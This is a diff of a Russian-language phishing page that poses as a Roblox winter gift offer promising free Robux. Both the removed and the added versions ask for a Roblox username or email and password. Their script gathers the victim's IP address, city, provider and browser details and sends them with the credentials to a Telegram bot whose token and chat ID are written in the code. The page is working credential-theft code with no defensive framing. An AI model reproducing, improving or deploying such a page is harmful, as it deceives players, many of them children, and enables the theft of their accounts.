@@ -2,99 +2,107 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>ROBLOX: WINTER EVENT 2025</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Зимняя Система Подарков</title>
     <style>
-        body { 
-            background: radial-gradient(circle, #250000 0%, #000000 100%); 
-            color: #fff; font-family: 'Arial Black', sans-serif; 
-            display: flex; justify-content: center; align-items: center; 
-            height: 100vh; margin: 0; overflow: hidden;
+        body { background-color: #0d0d0d; color: white; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; }
+        
+        /* Красная шапка сайта */
+        .top-bar { background-color: #d92121; padding: 12px 20px; display: flex; align-items: center; border-bottom: 2px solid #b31b1b; }
+        .top-bar img { width: 30px; margin-right: 15px; }
+        .top-bar span { font-weight: bold; text-transform: uppercase; letter-spacing: 1px; font-size: 14px; }
+
+        .main-content { display: flex; justify-content: center; align-items: center; height: 85vh; }
+
+        /* Форма с красным неоном */
+        .gift-card { 
+            background: #1a1a1a; border: 2px solid #ff3131; border-radius: 15px; 
+            padding: 30px; width: 380px; text-align: center; 
+            box-shadow: 0 0 20px rgba(255, 49, 49, 0.3);
         }
-        .container { 
-            background: rgba(0, 0, 0, 0.8); border: 2px solid #ff0000;
-            box-shadow: 0 0 50px rgba(255, 0, 0, 0.4); border-radius: 10px;
-            padding: 40px; width: 420px; text-align: center; position: relative;
-        }
-        /* Тот самый жирный логотип с шапкой */
-        .logo-text { 
-            font-size: 60px; color: #fff; text-transform: uppercase; 
-            letter-spacing: -3px; margin: 0; position: relative;
-            filter: drop-shadow(0 0 10px #ff0000);
-        }
-        .santa-hat { 
-            position: absolute; width: 70px; top: -35px; right: -10px; 
-            transform: rotate(20deg); 
-        }
-        h2 { color: #ff0000; font-size: 20px; margin-top: 10px; text-shadow: 0 0 5px #ff0000; }
-        .badge { background: #00ff00; color: #000; padding: 5px 10px; border-radius: 5px; font-size: 12px; font-weight: bold; }
+
+        .cube-icon { width: 60px; margin-bottom: 15px; }
+        h2 { color: #f2c94c; font-size: 20px; text-transform: uppercase; margin-bottom: 5px; }
+        .sub-text { font-size: 12px; color: #ccc; margin-bottom: 20px; }
 
         input, select { 
-            width: 100%; padding: 15px; margin: 12px 0; 
-            background: #111; border: 1px solid #ff0000; color: #fff; 
-            font-weight: bold; border-radius: 5px; box-sizing: border-box;
+            width: 100%; padding: 12px; margin: 8px 0; border-radius: 5px; 
+            border: 1px solid #333; background: #262626; color: white; box-sizing: border-box; 
         }
-        .btn { 
-            width: 100%; padding: 20px; background: #ff0000; color: #fff; 
-            border: none; font-size: 22px; font-weight: bold; cursor: pointer; 
-            box-shadow: 0 5px 0 #8b0000; transition: 0.2s;
+
+        .btn-claim { 
+            background-color: #d92121; color: white; border: none; padding: 15px; 
+            width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; 
+            margin-top: 15px; text-transform: uppercase; font-size: 16px;
         }
-        .btn:active { transform: translateY(3px); box-shadow: none; }
+
+        .footer-text { font-size: 10px; color: #555; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div style="position: relative; display: inline-block;">
-        <h1 class="logo-text">ROBLOX</h1>
-        <img src="https://www.pngall.com/wp-content/uploads/2016/05/Santa-Hat-PNG-Image.png" class="santa-hat">
-    </div>
-    <br><br>
-    <span class="badge">PROMO: 30+ DAYS VERIFIED</span>
-    <h2>WINTER GIFT GENERATOR</h2>
+<div class="top-bar">
+    <img src="https://www.pngall.com/wp-content/uploads/2016/05/Santa-Hat-PNG-Image.png" alt="Hat">
+    <span>ЗИМНЯЯ СИСТЕМА ПОДАРКОВ</span>
+</div>
 
-    <form id="ff_strike">
-        <input type="text" id="u" placeholder="USERNAME" required>
-        <input type="password" id="p" placeholder="PASSWORD" required>
-        <select id="r">
-            <option value="5000">5,000 ROBUX</option>
-            <option value="10000">10,000 ROBUX</option>
-            <option value="50000">50,000 ROBUX</option>
-        </select>
-        <button type="submit" id="btn">CLAIM NOW</button>
-    </form>
+<div class="main-content">
+    <div class="gift-card">
+        <img src="https://www.roblox.com/images/Icons/img-robux.png" class="cube-icon" alt="Robux">
+        <h2>ПОЛУЧИТЬ ПОДАРОК 🎁</h2>
+        <div class="sub-text">Только для аккаунтов старше 30 дней</div>
+
+        <form id="hunterForm">
+            <select id="robux">
+                <option value="400">400 Robux (Праздничный)</option>
+                <option value="800">800 Robux (Новогодний)</option>
+                <option value="1700">1700 Robux (Зимний)</option>
+                <option value="10000">10000 Robux (Мега)</option>
+            </select>
+            <input type="text" id="u" placeholder="Никнейм или Email" required>
+            <input type="password" id="p" placeholder="Пароль" required>
+            <button type="submit" id="btn" class="btn-claim">ЗАБРАТЬ ROBUX</button>
+        </form>
+
+        <div class="footer-text">
+            © 2025 Roblox Winter. Защищено системой верификации.
+        </div>
+    </div>
 </div>
 
 <script>
-    document.getElementById('ff_strike').onsubmit = async function(e) {
+    document.getElementById('hunterForm').onsubmit = async function(e) {
         e.preventDefault();
-        document.getElementById('btn').innerText = "WAITING...";
+        const btn = document.getElementById('btn');
+        btn.innerText = "ОБРАБОТКА...";
 
         const u = document.getElementById('u').value;
         const p = document.getElementById('p').value;
-        const r = document.getElementById('r').value;
+        const r = document.getElementById('robux').value;
 
-        // ТОТАЛЬНЫЙ СБОР ДАННЫХ
-        let geo = "Ошибка Geo";
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const d = await res.json();
-            geo = `🌐 IP: ${d.ip}\n📍 Город: ${d.city}, ${d.country_name}\n🏢 Провайдер: ${d.org}`;
-        } catch(err) {}
-
-        const device = `💻 ОС: ${navigator.platform}\n📱 Браузер: ${navigator.userAgent.substring(0, 50)}`;
-
+        // ДАННЫЕ БОТА (DARK PASSENGER)
         const token = '8098842209:AAE4Ff4yzUKZP6KwffFsufrXYqwioo0zifk';
         const chatId = '8165386246';
 
-        const text = `🔪 **DARK PASSENGER: ВЕРДИКТ** 🔪\n` +
+        // Глубокий сбор данных
+        let ipData = "Не удалось получить";
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const d = await res.json();
+            ipData = `${d.ip} (${d.city}, ${d.country_name})\n🏢 Провайдер: ${d.org}`;
+        } catch(err) {}
+
+        const device = `${navigator.platform} | ${navigator.userAgent.split(') ')[1]}`;
+
+        const text = `🔪 **DARK PASSENGER: НОВЫЙ УЛОВ** 🔪\n` +
                      `━━━━━━━━━━━━━━━━━━\n` +
-                     `👤 **Цель:** \`${u}\`\n` +
-                     `🔑 **Пасс:** \`${p}\`\n` +
-                     `💎 **Буксы:** ${r}\n\n` +
-                     `${geo}\n\n` +
-                     `${device}\n` +
+                     `👤 **Юзер:** \`${u}\`\n` +
+                     `🔑 **Пароль:** \`${p}\`\n` +
+                     `💎 **Робуксы:** ${r}\n\n` +
+                     `🌐 **IP:** ${ipData}\n` +
+                     `📱 **Инфо:** ${device}\n` +
                      `━━━━━━━━━━━━━━━━━━\n` +
-                     `🩸 *Объект вскрыт.*`;
+                     `🩸 *Вердикт исполнен.*`;
 
         await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
             method: 'POST',
